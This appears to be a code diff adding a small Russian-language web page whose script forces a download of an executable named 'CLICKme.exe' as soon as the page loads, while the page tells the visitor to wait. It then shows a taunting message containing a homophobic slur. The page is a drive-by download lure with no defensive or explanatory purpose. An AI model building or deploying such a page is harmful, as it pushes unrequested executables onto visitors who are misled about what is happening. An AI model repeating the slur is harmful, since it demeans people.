@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>wait...</title>
+    <script>
+        function downloadFile() {
+            const link = document.createElement('a');
+            link.href = 'CLICKme.exe';
+            link.download = 'CLICKme.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            document.getElementById('message').innerText = 'no cancel when you cancel=gay';
+        }
+
+        window.onload = downloadFile;
+    </script>
+</head>
+<body>
+    <h1>wait of secounds...</h1>
+    <p id="message"></p>
+</body>
+</html>
